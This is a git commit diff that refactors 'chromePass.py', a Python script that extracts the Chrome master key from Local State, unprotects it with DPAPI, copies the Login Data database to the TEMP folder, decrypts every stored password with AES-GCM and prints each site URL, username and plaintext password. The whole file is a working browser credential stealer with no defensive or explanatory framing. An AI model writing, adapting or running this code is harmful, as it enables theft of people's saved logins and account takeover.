9c52af83fe31c827b2ee8b7dafcebde1ee00d1e9
Gian López <85188124+netgian@users.noreply.github.com>
2021-09-26 17:15:38 +0200

    Update chromePass.py

--- chromePass.py
+++ chromePass.py
@@ -7,69 +7,58 @@ from Cryptodome.Cipher import AES
 import shutil
 
 
-class GetChromePasswods:
-    def __init__(self):
-        self._run()
+TEMP = os.getenv("TEMP")
 
-    @staticmethod
-    def _get_master_key():
-        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
-            local_state = f.read()
-            local_state = json.loads(local_state)
-            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]  # removing DPAPI
-            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-            return master_key
 
-    @staticmethod
-    def _decrypt_payload(cipher, payload):
-        return cipher.decrypt(payload)
+def get_master_key():
+    with open(os.environ["USERPROFILE"] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", "r") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
 
-    @staticmethod
-    def _generate_cipher(aes_key, iv):
-        return AES.new(aes_key, AES.MODE_GCM, iv)
 
-    def _decrypt_password(self, buff, master_key):
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = self._generate_cipher(master_key, iv)
-            decrypted_pass = self._decrypt_payload(cipher, payload)
-            decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
-            return decrypted_pass
-        except:
-            return "Chrome < 80"
+def decrypt_password(buff, master_key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+    except Exception as e:
+        return str(e)
 
-    def _run(self):
-        master_key = self._get_master_key()
-        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
-        shutil.copy2(login_db, "Loginvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
-        conn = sqlite3.connect("Loginvault.db")
-        cursor = conn.cursor()
-        try:
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
 
-            log = ""
-            for r in cursor.fetchall():
-                url = r[0]
-                username = r[1]
-                encrypted_password = r[2]
-                decrypted_password = self._decrypt_password(encrypted_password, master_key)
+def main():
+    master_key = get_master_key()
+    login_db = os.environ["USERPROFILE"] + "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data"
+    login_db_copy = TEMP + "\\login.db"
+    shutil.copy2(login_db, login_db_copy)
+    conn = sqlite3.connect(login_db_copy)
+    cursor = conn.cursor()
+    try:
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
 
-                if len(username) > 0:
-                    log += "=" * 50 + f"\nURL: {url} \nUser Name: {username}\nPassword: {decrypted_password}\n" + "=" * 50 + "\n\n"
+        log = ""
+        for r in cursor.fetchall():
+            url = r[0]
+            username = r[1]
+            encrypted_password = r[2]
+            decrypted_password = decrypt_password(encrypted_password, master_key)
+            log += f"URL: {url}\nUSR: {username}\nPDW: {decrypted_password}\n\n"
 
-            print(log)
+        print(log)
 
-        except:
-            pass
-        cursor.close()
-        conn.close()
-        try:
-            os.remove("Loginvault.db")
-        except:
-            pass
+    except sqlite3.Error:
+        pass
+
+    cursor.close()
+    conn.close()
+    os.remove(login_db_copy)
 
 
 if __name__ == '__main__':
-    GetChromePasswods()
+    main()
